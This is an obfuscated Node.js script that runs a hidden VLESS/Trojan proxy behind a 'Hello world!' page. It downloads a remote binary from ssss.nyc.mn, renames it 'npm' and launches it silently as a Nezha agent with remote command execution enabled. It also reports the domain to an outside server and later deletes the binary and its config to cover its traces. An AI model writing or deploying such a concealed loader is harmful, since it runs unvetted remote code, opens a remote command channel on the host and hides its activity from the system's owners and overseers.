const _0x1c3726=_0x3495;(function(_0x4a0ea4,_0x1b5cfd){const _0x16ccdd=_0x3495,_0x3197d2=_0x4a0ea4();while(!![]){try{const _0x1740a3=-parseInt(_0x16ccdd(0x162))/0x1+-parseInt(_0x16ccdd(0x129))/0x2+-parseInt(_0x16ccdd(0x136))/0x3+-parseInt(_0x16ccdd(0x152))/0x4+-parseInt(_0x16ccdd(0x113))/0x5*(-parseInt(_0x16ccdd(0x155))/0x6)+parseInt(_0x16ccdd(0x10b))/0x7+parseInt(_0x16ccdd(0xef))/0x8*(parseInt(_0x16ccdd(0x121))/0x9);if(_0x1740a3===_0x1b5cfd)break;else _0x3197d2['push'](_0x3197d2['shift']());}catch(_0x332dca){_0x3197d2['push'](_0x3197d2['shift']());}}}(_0x4cd3,0xf0815));const os=require('os'),http=require(_0x1c3726(0xf0)),fs=require('fs'),axios=require(_0x1c3726(0xf4)),net=require(_0x1c3726(0x142)),path=require(_0x1c3726(0x14b)),crypto=require(_0x1c3726(0x118)),{Buffer}=require(_0x1c3726(0x161)),{exec,execSync}=require(_0x1c3726(0x11b)),{WebSocket,createWebSocketStream}=require('ws'),UUID=process['env'][_0x1c3726(0x135)]||_0x1c3726(0xec),NEZHA_SERVER=process[_0x1c3726(0x134)][_0x1c3726(0xf5)]||'',NEZHA_PORT=process[_0x1c3726(0x134)][_0x1c3726(0x151)]||'',NEZHA_KEY=process['env'][_0x1c3726(0x16d)]||'',DOMAIN=process[_0x1c3726(0x134)][_0x1c3726(0x160)]||'1234.abc.com',AUTO_ACCESS=process[_0x1c3726(0x134)][_0x1c3726(0x106)]||!![],WSPATH=process['env'][_0x1c3726(0x122)]||UUID[_0x1c3726(0x15d)](0x0,0x8),SUB_PATH=process['env'][_0x1c3726(0x143)]||_0x1c3726(0x13b),NAME=process[_0x1c3726(0x134)][_0x1c3726(0x148)]||'',PORT=process['env']['PORT']||0x1eb4;let ISP='';const GetISP=async()=>{const _0xf7d6bf=_0x1c3726;try{const _0x143f9e=await axios[_0xf7d6bf(0x16e)](_0xf7d6bf(0x128)),_0x435621=_0x143f9e[_0xf7d6bf(0xf9)];ISP=(_0x435621[_0xf7d6bf(0x15a)]+'-'+_0x435621[_0xf7d6bf(0x101)])[_0xf7d6bf(0x108)](/ /g,'_');}catch(_0x28c78d){ISP=_0xf7d6bf(0x16b);}};GetISP();const httpServer=http[_0x1c3726(0x145)]((_0x1ea94c,_0x4f3909)=>{const _0x39efe4=_0x1c3726;if(_0x1ea94c[_0x39efe4(0x10c)]==='/'){const _0x1ec83e=path[_0x39efe4(0x10e)](__dirname,_0x39efe4(0x12b));fs[_0x39efe4(0xf2)](_0x1ec83e,_0x39efe4(0xf1),(_0x9f474,_0x8bf4ea)=>{const _0x8945e8=_0x39efe4;if(_0x9f474){_0x4f3909[_0x8945e8(0x124)](0xc8,{'Content-Type':'text/html'}),_0x4f3909[_0x8945e8(0x11f)](_0x8945e8(0x144));return;}_0x4f3909[_0x8945e8(0x124)](0xc8,{'Content-Type':_0x8945e8(0x14a)}),_0x4f3909[_0x8945e8(0x11f)](_0x8bf4ea);});return;}else{if(_0x1ea94c[_0x39efe4(0x10c)]==='/'+SUB_PATH){const _0x15873c=NAME?NAME+'-'+ISP:ISP,_0x202874='vless://'+UUID+'@'+DOMAIN+':443?encryption=none&security=tls&sni='+DOMAIN+_0x39efe4(0x146)+DOMAIN+_0x39efe4(0x133)+WSPATH+'#'+_0x15873c,_0x8f61ae='trojan://'+UUID+'@'+DOMAIN+':443?security=tls&sni='+DOMAIN+_0x39efe4(0x146)+DOMAIN+'&path=%2F'+WSPATH+'#'+_0x15873c,_0x36e0bf=_0x202874+'\x0a'+_0x8f61ae,_0x360aa0=Buffer[_0x39efe4(0x120)](_0x36e0bf)[_0x39efe4(0x12e)]('base64');_0x4f3909[_0x39efe4(0x124)](0xc8,{'Content-Type':'text/plain'}),_0x4f3909[_0x39efe4(0x11f)](_0x360aa0+'\x0a');}else _0x4f3909[_0x39efe4(0x124)](0x194,{'Content-Type':'text/plain'}),_0x4f3909[_0x39efe4(0x11f)](_0x39efe4(0xee));}}),wss=new WebSocket[(_0x1c3726(0x14e))]({'server':httpServer}),uuid=UUID[_0x1c3726(0x108)](/-/g,''),DNS_SERVERS=[_0x1c3726(0x16a),_0x1c3726(0x163)];function resolveHost(_0x4cf4dd){return new Promise((_0x1d19f8,_0x12717b)=>{const _0x227330=_0x3495;if(/^(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$/[_0x227330(0x12a)](_0x4cf4dd)){_0x1d19f8(_0x4cf4dd);return;}let _0x5adf75=0x0;function _0x48c254(){const _0x24b1dc=_0x227330;if(_0x5adf75>=DNS_SERVERS[_0x24b1dc(0x100)]){_0x12717b(new Error('Failed\x20to\x20resolve\x20'+_0x4cf4dd+_0x24b1dc(0x14f)));return;}const _0x557ce6=DNS_SERVERS[_0x5adf75];_0x5adf75++;const _0x1c1f6d=_0x24b1dc(0x130)+encodeURIComponent(_0x4cf4dd)+'&type=A';axios[_0x24b1dc(0x16e)](_0x1c1f6d,{'timeout':0x1388,'headers':{'Accept':_0x24b1dc(0x168)}})['then'](_0x2ca31c=>{const _0x5a3e7c=_0x24b1dc,_0x4bc571=_0x2ca31c['data'];if(_0x4bc571[_0x5a3e7c(0xeb)]===0x0&&_0x4bc571[_0x5a3e7c(0x116)]&&_0x4bc571[_0x5a3e7c(0x116)]['length']>0x0){const _0x551336=_0x4bc571[_0x5a3e7c(0x116)][_0x5a3e7c(0x13c)](_0x2e4390=>_0x2e4390[_0x5a3e7c(0x139)]===0x1);if(_0x551336){_0x1d19f8(_0x551336['data']);return;}}_0x48c254();})[_0x24b1dc(0x153)](_0x15340f=>{_0x48c254();});}_0x48c254();});}function handleVlessConnection(_0x473a98,_0x20f275){const _0x37cb0a=_0x1c3726,[_0x2f7e27]=_0x20f275,_0x3e2d9e=_0x20f275['slice'](0x1,0x11);if(!_0x3e2d9e[_0x37cb0a(0x14c)]((_0x158769,_0x5a5b93)=>_0x158769==parseInt(uuid[_0x37cb0a(0x11a)](_0x5a5b93*0x2,0x2),0x10)))return![];let _0x312fb8=_0x20f275[_0x37cb0a(0x15d)](0x11,0x12)[_0x37cb0a(0xf7)]()+0x13;const _0x4c45e7=_0x20f275['slice'](_0x312fb8,_0x312fb8+=0x2)[_0x37cb0a(0x138)](0x0),_0x3fe9c4=_0x20f275[_0x37cb0a(0x15d)](_0x312fb8,_0x312fb8+=0x1)[_0x37cb0a(0xf7)](),_0x1b7539=_0x3fe9c4==0x1?_0x20f275[_0x37cb0a(0x15d)](_0x312fb8,_0x312fb8+=0x4)[_0x37cb0a(0x10e)]('.'):_0x3fe9c4==0x2?new TextDecoder()[_0x37cb0a(0x164)](_0x20f275[_0x37cb0a(0x15d)](_0x312fb8+0x1,_0x312fb8+=0x1+_0x20f275[_0x37cb0a(0x15d)](_0x312fb8,_0x312fb8+0x1)[_0x37cb0a(0xf7)]())):_0x3fe9c4==0x3?_0x20f275[_0x37cb0a(0x15d)](_0x312fb8,_0x312fb8+=0x10)[_0x37cb0a(0x109)]((_0x2ae79,_0x29e188,_0x53f20a,_0x209053)=>_0x53f20a%0x2?_0x2ae79[_0x37cb0a(0x12f)](_0x209053['slice'](_0x53f20a-0x1,_0x53f20a+0x1)):_0x2ae79,[])[_0x37cb0a(0x107)](_0x16b379=>_0x16b379[_0x37cb0a(0x138)](0x0)['toString'](0x10))[_0x37cb0a(0x10e)](':'):'';_0x473a98[_0x37cb0a(0x112)](new Uint8Array([_0x2f7e27,0x0]));const _0x6ac799=createWebSocketStream(_0x473a98);return resolveHost(_0x1b7539)['then'](_0x190781=>{const _0x38acbb=_0x37cb0a;net[_0x38acbb(0x156)]({'host':_0x190781,'port':_0x4c45e7},function(){const _0x4020d3=_0x38acbb;this[_0x4020d3(0x13e)](_0x20f275['slice'](_0x312fb8)),_0x6ac799['on'](_0x4020d3(0x10a),()=>{})[_0x4020d3(0x115)](this)['on']('error',()=>{})['pipe'](_0x6ac799);})['on'](_0x38acbb(0x10a),()=>{});})[_0x37cb0a(0x153)](_0x30c4d3=>{const _0x40d157=_0x37cb0a;net[_0x40d157(0x156)]({'host':_0x1b7539,'port':_0x4c45e7},function(){const _0x4b0f24=_0x40d157;this[_0x4b0f24(0x13e)](_0x20f275[_0x4b0f24(0x15d)](_0x312fb8)),_0x6ac799['on'](_0x4b0f24(0x10a),()=>{})[_0x4b0f24(0x115)](this)['on'](_0x4b0f24(0x10a),()=>{})['pipe'](_0x6ac799);})['on'](_0x40d157(0x10a),()=>{});}),!![];}function handleTrojanConnection(_0xc343ba,_0x2afa53){const _0x7581a1=_0x1c3726;try{if(_0x2afa53['length']<0x3a)return![];const _0x27e471=_0x2afa53[_0x7581a1(0x15d)](0x0,0x38)[_0x7581a1(0x12e)](),_0x7b60f6=[UUID];let _0x40bf24=null;for(const _0x3f6d11 of _0x7b60f6){const _0x1c69be=crypto[_0x7581a1(0x11c)](_0x7581a1(0xea))[_0x7581a1(0x12d)](_0x3f6d11)[_0x7581a1(0x111)]('hex');if(_0x1c69be===_0x27e471){_0x40bf24=_0x3f6d11;break;}}if(!_0x40bf24)return![];let _0x119d27=0x38;_0x2afa53[_0x119d27]===0xd&&_0x2afa53[_0x119d27+0x1]===0xa&&(_0x119d27+=0x2);const _0x1822df=_0x2afa53[_0x119d27];if(_0x1822df!==0x1)return![];_0x119d27+=0x1;const _0x5ba34f=_0x2afa53[_0x119d27];_0x119d27+=0x1;let _0x116b26,_0x2b7ceb;if(_0x5ba34f===0x1)_0x116b26=_0x2afa53['slice'](_0x119d27,_0x119d27+0x4)[_0x7581a1(0x10e)]('.'),_0x119d27+=0x4;else{if(_0x5ba34f===0x3){const _0x5d9231=_0x2afa53[_0x119d27];_0x119d27+=0x1,_0x116b26=_0x2afa53['slice'](_0x119d27,_0x119d27+_0x5d9231)[_0x7581a1(0x12e)](),_0x119d27+=_0x5d9231;}else{if(_0x5ba34f===0x4)_0x116b26=_0x2afa53['slice'](_0x119d27,_0x119d27+0x10)[_0x7581a1(0x109)]((_0x13be1f,_0x109af9,_0xc576e8,_0x44c66c)=>_0xc576e8%0x2?_0x13be1f[_0x7581a1(0x12f)](_0x44c66c[_0x7581a1(0x15d)](_0xc576e8-0x1,_0xc576e8+0x1)):_0x13be1f,[])[_0x7581a1(0x107)](_0x151540=>_0x151540[_0x7581a1(0x138)](0x0)['toString'](0x10))[_0x7581a1(0x10e)](':'),_0x119d27+=0x10;else return![];}}_0x2b7ceb=_0x2afa53[_0x7581a1(0x138)](_0x119d27),_0x119d27+=0x2;_0x119d27<_0x2afa53[_0x7581a1(0x100)]&&_0x2afa53[_0x119d27]===0xd&&_0x2afa53[_0x119d27+0x1]===0xa&&(_0x119d27+=0x2);const _0x1ab95b=createWebSocketStream(_0xc343ba);return resolveHost(_0x116b26)[_0x7581a1(0x13f)](_0x107ce0=>{const _0x5e4359=_0x7581a1;net[_0x5e4359(0x156)]({'host':_0x107ce0,'port':_0x2b7ceb},function(){const _0x3d48c9=_0x5e4359;_0x119d27<_0x2afa53[_0x3d48c9(0x100)]&&this['write'](_0x2afa53[_0x3d48c9(0x15d)](_0x119d27)),_0x1ab95b['on']('error',()=>{})[_0x3d48c9(0x115)](this)['on']('error',()=>{})[_0x3d48c9(0x115)](_0x1ab95b);})['on'](_0x5e4359(0x10a),()=>{});})[_0x7581a1(0x153)](_0x919393=>{const _0x250a86=_0x7581a1;net[_0x250a86(0x156)]({'host':_0x116b26,'port':_0x2b7ceb},function(){const _0x141629=_0x250a86;_0x119d27<_0x2afa53[_0x141629(0x100)]&&this[_0x141629(0x13e)](_0x2afa53[_0x141629(0x15d)](_0x119d27)),_0x1ab95b['on'](_0x141629(0x10a),()=>{})[_0x141629(0x115)](this)['on'](_0x141629(0x10a),()=>{})[_0x141629(0x115)](_0x1ab95b);})['on']('error',()=>{});}),!![];}catch(_0x4075aa){return![];}}function _0x3495(_0x50dcf,_0x57117b){_0x50dcf=_0x50dcf-0xea;const _0x4cd332=_0x4cd3();let _0x3495ae=_0x4cd332[_0x50dcf];return _0x3495ae;}function _0x4cd3(){const _0x3e60a1=['8.8.4.4','Unknown','2087','NEZHA_KEY','get','sha224','Status','52f97b64-8820-4146-a697-03756cefc72f','connection','Not\x20Found\x0a','196304YQERbw','http','utf8','readFile','false','axios','NEZHA_SERVER','message','readUInt8','close','data','\x20-p\x20','Automatic\x20Access\x20Task\x20added\x20successfully','writeFileSync','log','--tls','Server\x20is\x20running\x20on\x20port\x20','length','isp','npm\x20download\x20successfully','setsid\x20nohup\x20./npm\x20-s\x20','application/json','split','AUTO_ACCESS','map','replace','reduce','error','12307883mFliZo','url','stream','join','client_secret:\x20','/bin/bash','digest','send','205zrPmrl','post','pipe','Answer','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','crypto','npm','substr','child_process','createHash','https://arm64.ssss.nyc.mn/v1','finish','end','from','1116CLgIFp','WSPATH','once','writeHead','npm\x20is\x20running','https://','trim','https://api.ip.sb/geoip','1987084nzVjBi','test','index.html','pop','update','toString','concat','https://dns.google/resolve?name=','aarch64','includes','&path=%2F','env','UUID','2642913DcfyBE','2096','readUInt16BE','type','arm','sub','find','setsid\x20nohup\x20./npm\x20-c\x20config.yaml\x20>/dev/null\x202>&1\x20&','write','then','true','npm\x20is\x20already\x20running,\x20skip\x20running...','net','SUB_PATH','Hello\x20world!','createServer','&fp=chrome&type=ws&host=','ps\x20aux\x20|\x20grep\x20-v\x20\x22grep\x22\x20|\x20grep\x20\x22./[n]pm\x22','NAME','2083','text/html','path','every','config.yaml','Server','\x20with\x20all\x20DNS\x20servers','2053','NEZHA_PORT','1046132vJPqTH','catch','https://amd64.ssss.nyc.mn/agent','39354IoNeNF','connect','chmod\x20+x\x20npm','arch','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20','country_code','arm64','\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20','slice','\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&','https://amd64.ssss.nyc.mn/v1','DOMAIN','buffer','1948745nlWHeQ','1.1.1.1','decode','https://arm64.ssss.nyc.mn/agent','utf-8','unlink','application/dns-json','error:\x20'];_0x4cd3=function(){return _0x3e60a1;};return _0x4cd3();}wss['on'](_0x1c3726(0xed),(_0x4d33e6,_0x54f06e)=>{const _0x21be1f=_0x1c3726,_0x33e02b=_0x54f06e[_0x21be1f(0x10c)]||'';_0x4d33e6[_0x21be1f(0x123)](_0x21be1f(0xf6),_0x588819=>{const _0x180800=_0x21be1f;if(_0x588819[_0x180800(0x100)]>0x11&&_0x588819[0x0]===0x0){const _0x23d853=_0x588819['slice'](0x1,0x11),_0x258257=_0x23d853[_0x180800(0x14c)]((_0x357aa6,_0xa0d3e0)=>_0x357aa6==parseInt(uuid['substr'](_0xa0d3e0*0x2,0x2),0x10));if(_0x258257){!handleVlessConnection(_0x4d33e6,_0x588819)&&_0x4d33e6[_0x180800(0xf8)]();return;}}!handleTrojanConnection(_0x4d33e6,_0x588819)&&_0x4d33e6[_0x180800(0xf8)]();})['on'](_0x21be1f(0x10a),()=>{});});const getDownloadUrl=()=>{const _0x270d19=_0x1c3726,_0x115597=os[_0x270d19(0x158)]();return _0x115597===_0x270d19(0x13a)||_0x115597===_0x270d19(0x15b)||_0x115597===_0x270d19(0x131)?!NEZHA_PORT?_0x270d19(0x11d):_0x270d19(0x165):!NEZHA_PORT?_0x270d19(0x15f):_0x270d19(0x154);},downloadFile=async()=>{const _0xa0f507=_0x1c3726;if(!NEZHA_SERVER&&!NEZHA_KEY)return;try{const _0x2d8ecd=getDownloadUrl(),_0x4b5d72=await axios({'method':_0xa0f507(0x16e),'url':_0x2d8ecd,'responseType':_0xa0f507(0x10d)}),_0x4d7b2e=fs['createWriteStream']('npm');return _0x4b5d72[_0xa0f507(0xf9)][_0xa0f507(0x115)](_0x4d7b2e),new Promise((_0x33cfc8,_0xfb9025)=>{const _0x37b5a4=_0xa0f507;_0x4d7b2e['on'](_0x37b5a4(0x11e),()=>{const _0x11edee=_0x37b5a4;console['log'](_0x11edee(0x102)),exec(_0x11edee(0x157),_0x5154e3=>{if(_0x5154e3)_0xfb9025(_0x5154e3);_0x33cfc8();});}),_0x4d7b2e['on'](_0x37b5a4(0x10a),_0xfb9025);});}catch(_0x34ea8b){throw _0x34ea8b;}},runnz=async()=>{const _0x258b27=_0x1c3726;try{const _0x18bfcf=execSync(_0x258b27(0x147),{'encoding':_0x258b27(0x166)});if(_0x18bfcf[_0x258b27(0x127)]()!==''){console['log'](_0x258b27(0x141));return;}}catch(_0x270e97){}await downloadFile();let _0x3cf2cf='',_0x5d07a9=['443','8443',_0x258b27(0x137),_0x258b27(0x16c),_0x258b27(0x149),_0x258b27(0x150)];if(NEZHA_SERVER&&NEZHA_PORT&&NEZHA_KEY){const _0x3e4507=_0x5d07a9[_0x258b27(0x132)](NEZHA_PORT)?_0x258b27(0xfe):'';_0x3cf2cf=_0x258b27(0x103)+NEZHA_SERVER+':'+NEZHA_PORT+_0x258b27(0xfa)+NEZHA_KEY+'\x20'+_0x3e4507+_0x258b27(0x15e);}else{if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x206332=NEZHA_SERVER[_0x258b27(0x132)](':')?NEZHA_SERVER[_0x258b27(0x105)](':')[_0x258b27(0x12c)]():'',_0x4ed9c0=_0x5d07a9[_0x258b27(0x132)](_0x206332)?_0x258b27(0x140):_0x258b27(0xf3),_0x29b920=_0x258b27(0x10f)+NEZHA_KEY+_0x258b27(0x159)+NEZHA_SERVER+_0x258b27(0x15c)+_0x4ed9c0+_0x258b27(0x117)+UUID;fs[_0x258b27(0xfc)](_0x258b27(0x14d),_0x29b920);}_0x3cf2cf=_0x258b27(0x13d);}else{console[_0x258b27(0xfd)]('NEZHA\x20variable\x20is\x20empty,\x20skip\x20running');return;}}try{exec(_0x3cf2cf,{'shell':_0x258b27(0x110)},_0x156e9a=>{const _0xd5489b=_0x258b27;if(_0x156e9a)console[_0xd5489b(0x10a)]('npm\x20running\x20error:',_0x156e9a);else console[_0xd5489b(0xfd)](_0xd5489b(0x125));});}catch(_0x41efc2){console[_0x258b27(0x10a)](_0x258b27(0x169)+_0x41efc2);}};async function addAccessTask(){const _0xa43f18=_0x1c3726;if(!AUTO_ACCESS)return;if(!DOMAIN)return;const _0x5753f0=_0xa43f18(0x126)+DOMAIN;try{const _0x6777d8=await axios[_0xa43f18(0x114)]('https://oooo.serv00.net/add-url',{'url':_0x5753f0},{'headers':{'Content-Type':_0xa43f18(0x104)}});console[_0xa43f18(0xfd)](_0xa43f18(0xfb));}catch(_0x55747f){}}const delFiles=()=>{const _0xc7c61f=_0x1c3726;fs[_0xc7c61f(0x167)](_0xc7c61f(0x119),()=>{}),fs[_0xc7c61f(0x167)](_0xc7c61f(0x14d),()=>{});};httpServer['listen'](PORT,()=>{const _0x3ccf23=_0x1c3726;runnz(),setTimeout(()=>{delFiles();},0x2bf20),addAccessTask(),console['log'](_0x3ccf23(0xff)+PORT);});
